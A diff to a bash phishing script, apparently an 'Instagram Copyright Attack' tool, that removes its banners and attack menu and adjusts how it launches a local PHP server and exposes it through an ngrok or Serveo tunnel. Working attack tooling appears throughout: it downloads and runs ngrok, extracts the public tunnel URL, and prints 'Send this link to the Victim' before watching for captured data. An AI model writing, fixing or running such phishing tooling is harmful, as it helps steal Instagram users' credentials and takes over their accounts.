@@ -12,60 +12,6 @@ dependencies() {
     
 }
 
-echo "
-    ▄█    █▄    ███    █▄    ▄▄▄▄███▄▄▄▄      ▄████████ ███▄▄▄▄
-    ███    ███   ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ ███▀▀▀██▄
-    ███    ███   ███    ███ ███   ███   ███   ███    █▀  ███   ███
-   ▄███▄▄▄▄███▄▄ ███    ███ ███   ███   ███  ▄███▄▄▄     ███   ███
-  ▀▀███▀▀▀▀███▀  ███    ███ ███   ███   ███ ▀▀███▀▀▀     ███   ███
-    ███    ███   ███    ███ ███   ███   ███   ███    █▄  ███   ███
-    ███    ███   ███    ███ ███   ███   ███   ███    ███ ███   ███
-    ███    █▀    ████████▀   ▀█   ███   █▀    ██████████  ▀█   █▀ Error
-
---  Made By SamadBloch The Malicious --
-
-
-"
-echo "[1] Instagram:- https://instagram.com/im_malicious"
-echo "[2] Twitter:-   https://twitter.com/Malicious_Coder"
-echo ""
-echo "This Tool is only for educational perposes Use this tool at your"
-echo "own risk the author is not responsible for your any miss use of "
-echo "of this tool."
-echo ""
-read -p "Pree Enter To Continue:"
-sleep 1 & clear
-
-echo "
-  ▄█    █▄    ███    █▄    ▄▄▄▄███▄▄▄▄      ▄████████ ███▄▄▄▄
-  ███    ███   ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ ███▀▀▀██▄
-  ███    ███   ███    ███ ███   ███   ███   ███    █▀  ███   ███
- ▄███▄▄▄▄███▄▄ ███    ███ ███   ███   ███  ▄███▄▄▄     ███   ███
-▀▀███▀▀▀▀███▀  ███    ███ ███   ███   ███ ▀▀███▀▀▀     ███   ███
-  ███    ███   ███    ███ ███   ███   ███   ███    █▄  ███   ███
-  ███    ███   ███    ███ ███   ███   ███   ███    ███ ███   ███
-  ███    █▀    ████████▀   ▀█   ███   █▀    ██████████  ▀█   █▀ Error
-
--_- Made By SamadbLoch The Malicious --
-
-"
-menu() {
-    
-    echo "[01] Instagram Copyright Attack"
-    read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose Attack: \e[0m\en' option
-    
-    
-    if [[ $option == 1 || $option == 01 ]]; then
-        server="instagram"
-        start1
-        
-    else
-        printf "\e[1;93m [!] Invalid option!\e[0m\n"
-        sleep 1
-        clear
-        menu
-    fi
-}
 
 stop() {
     
@@ -263,13 +209,9 @@ start() {
             download_ngrok='https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
         fi
         wget --no-check-certificate "$download_ngrok" >/dev/null 2>&1
-        unzip ngrok-stable-linux-arm.zip >/dev/null 2>&1
-        chmod +x .server/ngrok >/dev/null 2>&1
-        rm -rf ngrok-stable-linux-arm.zip >/dev/null 2>&1
-        
-        unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+        file=$(basename "$download_ngrok")
+        unzip "$file" >/dev/null 2>&1
         chmod +x ngrok
-        rm -rf ngrok-stable-linux-arm.zip
     fi
     
     printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
@@ -277,19 +219,17 @@ start() {
     sleep 2
     printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
     ./ngrok http 3333 > /dev/null 2>&1 &
-    sleep 10
+    sleep 5
     
-    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[a-zA-Z0-9./?=_%:-]*\.ngrok.io")
     printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
     checkfound
 }
 
-start1() {
+menu() {
     if [[ -e sendlink ]]; then
         rm -rf sendlink
     fi
-    
-    
     printf "\n"
     printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
@@ -304,7 +244,7 @@ start1() {
         printf "\e[1;93m [!] Invalid option!\e[0m\n"
         sleep 1
         clear
-        start1
+        menu
     fi
     
 }
@@ -334,4 +274,3 @@ checkfound() {
 }
 dependencies
 menu
-
